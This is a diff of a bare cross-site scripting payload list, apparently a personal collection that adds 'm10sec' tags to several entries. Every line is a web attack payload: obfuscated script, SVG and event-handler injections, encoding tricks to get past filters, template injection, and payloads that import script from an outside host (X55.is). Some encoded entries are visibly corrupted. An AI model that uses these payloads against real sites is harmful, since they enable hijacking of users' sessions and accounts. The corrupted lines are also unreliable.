@@ -1,20 +1,21 @@
 𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()<Svg OnLoad="alert//>%0A(1)"
 <Svg Only=1 OnLoad=confirm(1)>
+--'<00 foo="<a%20href="javascript​:prompt(404)">XSS-Click-m10-sec</00>--%20//
 %3Csvg%20xmlns%3D%22http%3A%2F%http://2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cscript%3Eprompt%28%22XSS%22%29%3C%2Fscript%3E%3C%2Fsvg%3E
 <scr%u0069pt>alert('XSS');</scr%u0069pt>
 <script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
-<script>setTimeout('alert(\"XSS\")', 1000);</script>
+<script>setTimeout('alert(\"XSS.m10sec\")', 1000);</script>
 <svg/onload=eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))>
 <script>document.write('<img src=x onerror=alert("XSS")>');</script>
 <a href="javascript:&#97;&#108;&#101;&#114;&#116;('XSS')">Click me</a>
-{"user":"<script>alert('XSS')</script>"}
+{"user":"<script>alert('XSS_m10sec')</script>"}
 <script>setInterval('alert("XSS")', 3000);</script>
 /*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e
 <Svg OnLoad=confirm(1)>
 %C0%BCSvg%C0%A0OnLoad%C0%BDconfirm%C0%A81%C0%A9%C0%BE
 <Svg OnLoad=import('//X55.is')>
 %C0%BCSvg%C0%A0OnLoad%C0%BDimport%C0%A8%C0%A7%C0%AF%C0%http://AFX55.is%C0%A7%C0%A9%C0%BE
-<div id="xss">Hover me!</div>
+<div id="xss">Hover me!_m10sec</div>
 <script>document.getElementById('xss').onmouseover=function(){this.innerHTML='<img src=x onerror=alert(1)>'}</script>
 <a href="javascript:alert(atob('WFNT'))">Click Me</a>
 %3Cinput%20type=text%20value=jaVasCript:/*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert()//%3E\x3e%3E%3C/input%3E
@@ -23,7 +24,7 @@
 {{$on.constructor('alert(1)')()}}
 <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()%20x>
 &lt;script&gt;alert('XSS')&lt;/script&gt;
-&lt;img src=x onerror=alert('XSS')&gt;
+&lt;img src=x onerror=alert('XSS.m10.sec')&gt;
 jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e
 "-prompt(8)-"
 '-prompt(8)-'
